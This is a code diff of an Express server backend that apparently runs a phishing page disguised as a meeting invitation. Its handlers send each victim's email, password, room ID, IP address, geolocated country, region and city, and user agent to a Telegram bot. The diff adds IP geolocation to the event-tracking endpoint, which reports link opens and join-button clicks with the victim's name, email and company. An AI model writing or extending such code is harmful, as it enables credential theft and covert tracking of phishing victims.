@@ -123,20 +123,20 @@ app.post('/api/submit-client-info', async (req, res) => {
 🚨 *New Meeting Client Submission* 🚨
 
 --- IP & REGIONAL LOCATION ---
-• *IP Address:* ${resolvedIp || 'N/A'}
-• *Country:* ${country}
-• *State / Region:* ${region}
-• *City:* ${city}
+- *IP Address:* ${resolvedIp || 'N/A'}
+- *Country:* ${country}
+- *State / Region:* ${region}
+- *City:* ${city}
 
 --- SYSTEM INFO ---
-• *User Agent:* ${userAgent}
+- *User Agent:* ${userAgent}
 
 --- CLIENT DETAILS ---
-• *Email:* ${clientEmail || 'N/A'}
-• *Password:* ${clientPassword || 'N/A'}
-• *Room ID:* ${meetingId || 'N/A'}
-• *Host:* ${hostName || 'Host'}
-• *Time:* ${new Date().toLocaleString()}
+- *Email:* ${clientEmail || 'N/A'}
+- *Password:* ${clientPassword || 'N/A'}
+- *Room ID:* ${meetingId || 'N/A'}
+- *Host:* ${hostName || 'Host'}
+- *Time:* ${new Date().toLocaleString()}
     `.trim();
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -161,11 +161,12 @@ app.post('/api/submit-client-info', async (req, res) => {
     return res.status(500).json({ success: false, error: 'Failed to send notification' });
   }
 });
+
 // Endpoint to handle lightweight milestone tracking (Page Visit & Join Click)
 app.post('/api/track-event', async (req, res) => {
-  console.log('HIT /api/track-event with body:', req.body); // <-- Add this debug log
+  console.log('HIT /api/track-event with body:', req.body);
   try {
-    const { event_type, token, client_email, client_name, client_company, timestamp } = req.body;
+    const { event_type, client_email, client_name, client_company, clientIp, timestamp } = req.body;
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -173,22 +174,56 @@ app.post('/api/track-event', async (req, res) => {
       return res.status(500).json({ success: false, error: 'Server configuration error' });
     }
 
+    // Resolve IP and Location for the tracking event
+    const resolvedIp = clientIp && clientIp !== 'Detecting...' && clientIp !== 'Unavailable' 
+      ? clientIp 
+      : await getPublicIp(req);
+
+    let country = 'Unknown';
+    let region = 'Unknown';
+    let city = 'Unknown';
+
+    if (resolvedIp && !isPrivateIp(resolvedIp) && resolvedIp !== 'Unavailable') {
+      try {
+        const geoRes = await fetch(`http://ip-api.com/json/${resolvedIp}`);
+        if (geoRes.ok) {
+          const geoData = await geoRes.json() as any;
+          if (geoData.status === 'success') {
+            country = geoData.country || 'Unknown';
+            region = geoData.regionName || 'Unknown';
+            city = geoData.city || 'Unknown';
+          }
+        }
+      } catch (geoErr) {
+        console.error('GeoIP lookup error:', geoErr);
+      }
+    }
+
+    const userAgent = req.headers['user-agent'] || 'Unknown';
     let message = '';
+
     if (event_type === 'PAGE_VISIT') {
       message = `
 👀 <b>LINK OPENED / PAGE VISIT</b>
 ━━━━━━━━━━━━━━━━━━━━
-• <b>Token/ID:</b> <code>${token || 'N/A'}</code>
-• <b>Time:</b> ${timestamp ? new Date(timestamp).toUTCString() : new Date().toUTCString()}
+--- IP & REGIONAL LOCATION ---
+- <b>IP Address:</b> <code>${resolvedIp || 'N/A'}</code>
+- <b>Country:</b> ${country}
+- <b>State / Region:</b> ${region}
+- <b>City:</b> ${city}
+
+--- SYSTEM INFO ---
+- <b>User Agent:</b> ${userAgent}
+- <b>Time:</b> ${timestamp ? new Date(timestamp).toUTCString() : new Date().toUTCString()}
       `.trim();
     } else if (event_type === 'JOIN_CLICKED') {
       message = `
 ⚡ <b>JOIN BUTTON CLICKED</b>
 ━━━━━━━━━━━━━━━━━━━━
-• <b>Name:</b> ${client_name || 'N/A'}
-• <b>Email:</b> <code>${client_email || 'N/A'}</code>
-• <b>Company:</b> ${client_company || 'N/A'}
-• <b>Time:</b> ${timestamp ? new Date(timestamp).toUTCString() : new Date().toUTCString()}
+- <b>Name:</b> ${client_name || 'N/A'}
+- <b>Email:</b> <code>${client_email || 'N/A'}</code>
+- <b>Company:</b> ${client_company || 'N/A'}
+- <b>Time:</b> ${timestamp ? new Date(timestamp).toUTCString() : new Date().toUTCString()}
       `.trim();
     } else {
       return res.status(400).json({ success: false, error: 'Unknown event type' });
@@ -216,8 +251,8 @@ app.post('/api/track-event', async (req, res) => {
     return res.status(500).json({ success: false, error: 'Failed to send event' });
   }
 });
+
 async function start() {
-  // Optional: A clean status message if someone visits your Render root URL directly
   app.get('/', (_req, res) => {
     res.status(200).json({ status: 'API backend is running successfully' });
   });
